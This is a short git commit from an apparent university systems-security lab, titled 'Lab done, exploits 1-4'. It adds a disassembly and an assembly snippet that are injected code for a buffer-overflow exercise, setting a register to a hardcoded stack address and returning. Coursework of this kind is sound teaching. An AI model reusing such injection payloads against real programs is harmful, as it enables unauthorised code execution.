e7c761804ec3e89dc7204d3f47f84b7fe687bc30
Khalil Jackson <kjackson@bowdoin.edu>
2023-04-11 22:10:19 -0400

    Lab done, exploits 1-4

---
+++ 3-implode.d
@@ -0,0 +1,9 @@
+
+3-implode.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c4 b7 89 64 55 	mov    $0x556489b7,%rsp
+   7:	c3                   	retq   
---
+++ implode.s
@@ -0,0 +1,2 @@
+movq $0x556489dd, %rdi /* move value to rdi */
+ret
